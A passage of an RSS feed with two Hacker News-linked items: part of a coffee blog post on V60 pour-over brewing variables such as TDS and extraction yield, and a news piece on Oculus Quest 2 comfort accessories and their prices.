<div><figure><img loading="lazy" data-attachment-id="590" data-permalink="https://coffeeadastra.com/img_8424/" data-orig-file="https://coffeeadastra.files.wordpress.com/2018/11/img_8424.png" data-orig-size="3024,4032" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_8424" data-image-description="" data-medium-file="https://coffeeadastra.files.wordpress.com/2018/11/img_8424.png?w=225" data-large-file="https://coffeeadastra.files.wordpress.com/2018/11/img_8424.png?w=750" src="https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=768" alt="" width="301" height="401" srcset="https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=301 301w, https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=602 602w, https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=113 113w, https://jgagneastro.files.wordpress.com/2018/11/img_8424.png?w=225 225w" sizes="(max-width: 301px) 100vw, 301px"><figcaption>Uh oh (I won‚Äôt say where I got this latte). It tasted as good as the latte art looks.</figcaption></figure></div>


<p><span>A V60 offers the advantage of potentially producing a great cup (if you do<span>&nbsp; </span>things correctly) with a ~20$ piece of equipment. Plus, it‚Äôs really easy to clean and carry for travel, and it‚Äôs more flexible than a cheap batch brewer if you want to experiment with your brew recipes.</span></p>
<p><span>In my view, there are three challenges when using a V60: (1) being consistent from one brew to the next, (2) not losing a lot of heat from your brew water, and (3) having several of your brew variables intertwined (we‚Äôll come back to what these variables are), leaving you with less control over individual variables.</span></p>
<h2><span><b><i>4. The Brew Variables</i></b></span></h2>
<p><span>There are several brew variables that will affect the taste (e.g., extraction yield) and strength of your cup:</span></p>
<ul>
<li>
<ul>
<li><span>Coffee to water ratio<br></span></li>
<li><span>Coffee beans quality</span></li>
<li><span>Roast profile and quality</span></li>
<li>Grind size</li>
<li>Grind uniformity</li>
<li>Coffee freshness</li>
<li>Filter quality</li>
<li>Brew temperature</li>
<li>Water agitation</li>
<li>Uniformity of extraction and repeatability</li>
<li>Water quality</li>
<li>Contact time between water and grounds</li>
</ul>
</li>
</ul>
<p><span>These are not listed in order of importance, but rather in order that we will discuss them.</span></p>
<h3><span><b><i>4.1 Coffee to Water Ratio</i></b></span></h3>
<p><span>It is useful to describe two relevant ways in which a coffee cup can vary: (1) strength, and (2) extraction yield. Strength is basically just how concentrated your coffee is, e.g. an espresso is much stronger than a filter coffee. The clarity of a coffee cup will be affected by this (but also by many other things). The strength is typically measured in ‚Äútotal dissolved solids‚Äù (TDS). It corresponds to the fraction mass of all non-H</span><span><sub>2</sub></span><span>O stuff in your cup, and can be measured with refractometers. Some Brix optical refractometers can be bought for ~20 $; (I use <a href="https://www.amazon.com/gp/product/B01LW4HHRC/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B01LW4HHRC&amp;linkCode=as2&amp;tag=coffeeadastra-20&amp;linkId=a9b009e1cd67a3ec622e7f14958fca92"><span>this one</span></a>), but their precision is not great at ~0.1‚Äì0.2% TDS (you also need to convert ¬∞Brix to TDS with <a href="http://coffeegeek.com/forums/coffee/machines/203992"><span>Alan Adler‚Äôs</span></a> relation; TDS = 0.85 x ¬∞Brix). Refractometers can be very useful for diagnostics and communication, even though they shouldn‚Äôt replace your taste buds. More precise refractometers cost a few hundred dollars. Ideally, you want a brew strength high enough without overwhelming your senses, so that you can appreciate the full aromatic complexity of your cup of coffee. This is a matter of personal preference (and context; an espresso will be perceived as very weak if it has double the strength of a filter coffee), but most people prefer a strength of 1.15‚Äì1.35% TDS.</span></p>
<p><span>Extraction yield is the total mass fraction of your coffee grounds that was dissolved into your cup of coffee. This variable will mostly affect the taste profile of your cup, because different compounds dissolve in water at different rates. You can use less coffee with a higher extraction yield and end up with the same strength, but you will have a larger extraction yield, and your taste profile will contain more of the aromatic compounds that are longer to extract from the coffee bean. Typical preferred extractions are in the range 18‚Äì22%, and a higher ‚Ä¶</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://coffeeadastra.com/2018/11/30/brewing-better-coffee/">https://coffeeadastra.com/2018/11/30/brewing-better-coffee/</a></em></p>]]>
            </description>
            <link>https://coffeeadastra.com/2018/11/30/brewing-better-coffee/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574431</guid>
            <pubDate>Thu, 24 Sep 2020 01:36:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Oculus Quest 2 spending design time on comfort]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24574155">thread link</a>) | @vrfinal
<br/>
September 23, 2020 | https://www.vrfinal.com/oculus-quest-2-comfort-accessories-pre-orders-open/ | <a href="https://web.archive.org/web/*/https://www.vrfinal.com/oculus-quest-2-comfort-accessories-pre-orders-open/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                  <div><p>The sequel to the <em>Oculus Quest</em>, the <em>Quest 2</em>, was <a href="https://www.vrfinal.com/oculus-quest-2-officially-announced-heres-the-scoop/">revealed earlier this month at Facebook Connect</a>. <a href="https://www.vrfinal.com/quest-2-leak/">Since rumours started circulating</a>, much has been made of the headset‚Äôs emphasis on comfort and immersion ‚Äì the <em>Quest 2</em> is 10% lighter and comes fitted with soft-touch fabric head straps. But the headset was also said to ‚Äúsupport a new line of optional" add-ons to bring comfort to the next level. Now, pre-orders have opened for the first of these accessories.</p><p>The <em>VR Cover</em> is a customisable facial interface and foam replacement set designed to increase ‚Äúhygiene, comfort and immersion.‚Äù Although the <em>VR Cover</em> has been popular among <em>Quest</em> users for years, the <em>Quest 2</em> interface includes ‚Äúvents added along the top to maintain good air circulation and reduce the build-up of heat and moisture that can fog up the lenses.‚Äù Two versions of the foam insert will be included ‚Äì ‚Äòstandard‚Äô and ‚Äòcomfort‚Äô. <a href="https://www.oculus.com/quest-2/accessories">Pre-orders for the <em>VR Cover</em> are open now</a>, priced at $29.</p></div><figure><img src="https://www.vrfinal.com/content/images/2020/09/VR-Cover.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/09/VR-Cover.jpg 600w, https://www.vrfinal.com/content/images/2020/09/VR-Cover.jpg 1000w" sizes="(min-width: 720px) 720px"><figcaption>The <em>VR Cover </em>will increase hygiene, comfort, ventilation and immersion. (Credit: Facebook/Oculus)</figcaption></figure><p>The <em>Elite Strap</em> was also unveiled last week. First impressions of the <em>Quest 2</em> show us that although comfort was addressed, the weight of the device still sometimes seems to cause issues. The <em>Elite Strap</em> is intended to fix this problem. Armed with a plastic arm to better bare the <em>Quest 2</em>‚Äôs weight, the <em>Elite Strap</em> also features a dial at the back to form the perfect fit on your head. <a href="https://www.oculus.com/quest-2/accessories">The <em>Elite Strap</em> is available now for pre-orders</a> at a price of $49. Facebook is also releasing another version with a battery pack and a carry case for $129.</p><figure><img src="https://www.vrfinal.com/content/images/2020/09/Elite-strap.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/09/Elite-strap.jpg 600w, https://www.vrfinal.com/content/images/size/w1000/2020/09/Elite-strap.jpg 1000w, https://www.vrfinal.com/content/images/size/w1600/2020/09/Elite-strap.jpg 1600w, https://www.vrfinal.com/content/images/2020/09/Elite-strap.jpg 1920w" sizes="(min-width: 720px) 720px"><figcaption>The <em>Elite Strap </em>helps bare the load of the Quest 2, which can feel heavy even with a 10% weight reduction. (Credit: Facebook/Oculus)</figcaption></figure><p>With these accessories at the forefront of Facebook‚Äôs approach to the <em>Quest 2</em>, its clear comfort is still king in creating their most immersive VR experience yet. Just as well because I can foresee myself spending a lot of time playing <a href="https://www.vrfinal.com/splinter-cell-and-assassins-creed-games-are-coming-to-vr/">these Quest exclusives</a>!</p>
                </div></div>]]>
            </description>
            <link>https://www.vrfinal.com/oculus-quest-2-comfort-accessories-pre-orders-open/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574155</guid>
            <pubDate>Thu, 24 Sep 2020 00:51:03 GMT</pubDate>
        </item>
    </channel>
</rss>
